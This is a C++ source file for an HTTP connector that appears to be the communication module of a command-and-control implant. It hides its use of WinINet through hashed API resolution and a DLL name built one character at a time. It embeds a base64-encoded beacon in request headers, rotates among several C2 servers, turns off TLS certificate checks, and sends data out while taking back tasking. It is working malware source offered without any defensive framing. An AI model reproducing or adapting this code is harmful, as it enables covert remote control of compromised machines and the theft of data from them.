#include "ConnectorHTTP.h"
#include "ApiLoader.h"
#include "ApiDefines.h"
#include "ProcLoader.h"
#include "Encoders.h"

BOOL _isdigest(char c)
{
	return c >= '0' && c <= '9';
}

int _atoi(const char* str) 
{
	int result = 0;
	int sign = 1;
	int index = 0;

	while (str[index] == ' ')
		index++;
	
	if (str[index] == '-' || str[index] == '+') {
		sign = (str[index] == '-') ? -1 : 1;
		index++;
	}

	while ( _isdigest(str[index]) ) {
		int digit = str[index] - '0';
		if (result > (INT_MAX - digit) / 10) 
			return (sign == 1) ? INT_MAX : INT_MIN;
		
		result = result * 10 + digit;
		index++;
	}
	return result * sign;
}

DWORD _strlen(CHAR* str)
{
	int i = 0;
	if (str != NULL)
		for (; str[i]; i++);
	return i;
}

ConnectorHTTP::ConnectorHTTP()
{
	this->functions = (HTTPFUNC*) ApiWin->LocalAlloc(LPTR, sizeof(HTTPFUNC) );
	
	this->functions->LocalAlloc   = ApiWin->LocalAlloc;
	this->functions->LocalReAlloc = ApiWin->LocalReAlloc;
	this->functions->LocalFree    = ApiWin->LocalFree;
	this->functions->LoadLibraryA = ApiWin->LoadLibraryA;
	this->functions->GetLastError = ApiWin->GetLastError;

	CHAR wininet_c[12];
	wininet_c[0]  = HdChrA('w');
	wininet_c[1]  = HdChrA('i');
	wininet_c[2]  = HdChrA('n');
	wininet_c[3]  = HdChrA('i');
	wininet_c[4]  = HdChrA('n');
	wininet_c[5]  = HdChrA('e');
	wininet_c[6]  = HdChrA('t');
	wininet_c[7]  = HdChrA('.');
	wininet_c[8]  = HdChrA('d');
	wininet_c[9]  = HdChrA('l');
	wininet_c[10] = HdChrA('l');
	wininet_c[11] = HdChrA(0);

	HMODULE hWininetModule = this->functions->LoadLibraryA(wininet_c);
	if (hWininetModule) {
		this->functions->InternetOpenA              = (decltype(InternetOpenA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETOPENA);
		this->functions->InternetConnectA           = (decltype(InternetConnectA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCONNECTA);
		this->functions->HttpOpenRequestA           = (decltype(HttpOpenRequestA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPOPENREQUESTA);
		this->functions->HttpSendRequestA           = (decltype(HttpSendRequestA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPSENDREQUESTA);
		this->functions->InternetSetOptionA         = (decltype(InternetSetOptionA)*)		  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETSETOPTIONA);
		this->functions->InternetQueryOptionA       = (decltype(InternetQueryOptionA)*)		  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYOPTIONA);
		this->functions->HttpQueryInfoA             = (decltype(HttpQueryInfoA)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_HTTPQUERYINFOA);
		this->functions->InternetQueryDataAvailable = (decltype(InternetQueryDataAvailable)*) GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETQUERYDATAAVAILABLE);
		this->functions->InternetCloseHandle        = (decltype(InternetCloseHandle)*)		  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETCLOSEHANDLE);
		this->functions->InternetReadFile           = (decltype(InternetReadFile)*)			  GetSymbolAddress(hWininetModule, HASH_FUNC_INTERNETREADFILE);
	}
}

BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
{
	LPSTR encBeat = b64_encode(beat, beatSize);

	ULONG enc_beat_length = _strlen(encBeat);
	ULONG param_length    = _strlen((CHAR*) profile.parameter);
	ULONG headers_length  = _strlen((CHAR*) profile.http_headers);

	CHAR* HttpHeaders = (CHAR*) this->functions->LocalAlloc(LPTR, param_length + enc_beat_length + headers_length + 5);
	memcpy(HttpHeaders, profile.http_headers, headers_length);
	ULONG index = headers_length;
	memcpy(HttpHeaders + index, profile.parameter, param_length);
	index += param_length;
	HttpHeaders[index++] = ':';
	HttpHeaders[index++] = ' ';
	memcpy(HttpHeaders + index, encBeat, enc_beat_length);
	index += enc_beat_length;
	HttpHeaders[index++] = '\r';
	HttpHeaders[index++] = '\n';
	HttpHeaders[index++] = 0;

	memset(encBeat, 0, enc_beat_length);
	this->functions->LocalFree(encBeat);
	encBeat = NULL;

	this->headers        = HttpHeaders;
	this->server_count   = profile.servers_count;
	this->server_address = (CHAR**) profile.servers;
	this->server_ports   = profile.ports;
	this->ssl            = profile.use_ssl;
	this->http_method    = (CHAR*) profile.http_method;
	this->uri            = (CHAR*) profile.uri;
	this->user_agent     = (CHAR*) profile.user_agent;
	this->ans_size		 = profile.ans_size;
	this->ans_pre_size   = profile.ans_pre_size;

	return TRUE;
}

void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
{
    this->recvSize = 0;
    this->recvData = 0;

    const char* CLOSE_HDR = "Connection: close\r\n";

    ULONG attempt = 0;
    while (attempt < this->server_count)
    {
        DWORD     dwError   = 0;
        BOOL      connected = FALSE;
        HINTERNET hRequest  = NULL;
        HINTERNET hConnect  = NULL;
        char*     sendHdr   = NULL;
        DWORD     closeLen  = 19, hdrLen = 0, allLen = 0;
        CHAR      acceptTypes[4] = { '*', '/', '*', 0 };
        LPCSTR    types[2]       = { acceptTypes, 0 };
        DWORD     flags          = 0;

        HINTERNET hInternet = this->functions->InternetOpenA(
                this->user_agent,
                INTERNET_OPEN_TYPE_DIRECT,
                NULL,
                NULL,
                0);
        if (!hInternet) return;

        hConnect = this->functions->InternetConnectA(
            hInternet,
            this->server_address[this->server_index],
            this->server_ports[this->server_index],
            NULL, NULL,
            INTERNET_SERVICE_HTTP,
            0,
            0);
        if (!hConnect) goto ROTATE;

        flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE |
                INTERNET_FLAG_NO_UI  | INTERNET_FLAG_NO_COOKIES;
        if (this->ssl) flags |= INTERNET_FLAG_SECURE;

        hRequest = this->functions->HttpOpenRequestA(
            hConnect,
            this->http_method,
            this->uri,
            NULL,
            NULL,
            types,
            flags,
            0);
        if (!hRequest) goto ROTATE;

        {
            BOOL disableReuse = TRUE;
            this->functions->InternetSetOptionA(hRequest, 0x33, &disableReuse, sizeof(disableReuse));
        }

        hdrLen  = (DWORD)_strlen(this->headers);
        allLen  = closeLen + hdrLen;
        sendHdr = (char*)this->functions->LocalAlloc(LPTR, allLen + 1);
        if (!sendHdr) goto ROTATE;
        memcpy(sendHdr, CLOSE_HDR, closeLen);
        memcpy(sendHdr + closeLen, this->headers, hdrLen);
        sendHdr[allLen] = 0;

        if (this->ssl)
        {
            DWORD dwFlags, sz = sizeof(dwFlags);
            if (this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &sz)) {
                dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
                this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
            }
        }

        connected = this->functions->HttpSendRequestA(hRequest, sendHdr, allLen, (LPVOID)data, (DWORD)data_size);

        if (connected) {
            char status[16] = {0}; DWORD stLen = sizeof(status);
            if (this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, status, &stLen, 0) && _atoi(status)==200)
            {
                DWORD answerSize = 0, sz = sizeof(DWORD);
                if (this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH|HTTP_QUERY_FLAG_NUMBER, &answerSize, &sz, NULL) && answerSize) {
                    DWORD avail=0, readed=0; ULONG total=0;
                    BYTE* buf=(BYTE*)this->functions->LocalAlloc(LPTR,answerSize);
                    while (total<answerSize && this->functions->InternetQueryDataAvailable(hRequest,&avail,0,0)&&avail) {
                        if (!this->functions->InternetReadFile(hRequest,buf+total,avail,&readed)||!readed) break;
                        total+=readed;
                    }
                    if (total){this->recvSize=total;this->recvData=buf;} else this->functions->LocalFree(buf);
                } else if (this->functions->GetLastError()==ERROR_HTTP_HEADER_NOT_FOUND) {
                    DWORD avail=0, readed=0; ULONG total=0;
                    BYTE* buf=(BYTE*)this->functions->LocalAlloc(LPTR,0);
                    while (this->functions->InternetQueryDataAvailable(hRequest,&avail,0,0)&&avail) {
                        buf=(BYTE*)this->functions->LocalReAlloc(buf,total+avail,LMEM_MOVEABLE);
                        if (!this->functions->InternetReadFile(hRequest,buf+total,avail,&readed)||!readed) break;
                        total+=readed;
                    }
                    if(total){this->recvSize=total;this->recvData=buf;} else this->functions->LocalFree(buf);
                }
            }
        }

ROTATE:
        if (sendHdr) this->functions->LocalFree(sendHdr);
        if (hRequest) this->functions->InternetCloseHandle(hRequest);
        if (hConnect) this->functions->InternetCloseHandle(hConnect);
        this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_END_BROWSER_SESSION, NULL, 0);
        if (hInternet) this->functions->InternetCloseHandle(hInternet);

        if (connected) break;
        attempt++;
        this->server_index = (this->server_index + 1) % this->server_count;
        Sleep(300);
    }
}

BYTE* ConnectorHTTP::RecvData()
{
	if (this->recvData)
		return this->recvData + this->ans_pre_size;
	else
		return NULL;
}

int ConnectorHTTP::RecvSize()
{
	if (this->recvSize < this->ans_size)
		return 0;

	return this->recvSize - this->ans_size;
}

void ConnectorHTTP::RecvClear()
{
	if (this->recvData && this->recvSize) {
		memset(this->recvData, 0, this->recvSize);
		this->functions->LocalFree(this->recvData);
		this->recvData = NULL;
	}
}

void ConnectorHTTP::CloseConnector()
{
	DWORD l = _strlen(this->headers);
	memset(this->headers, 0, l);
	this->functions->LocalFree(this->headers);
	this->headers = NULL;

	this->functions->InternetCloseHandle(this->hInternet);
	this->functions->InternetCloseHandle(this->hConnect);
}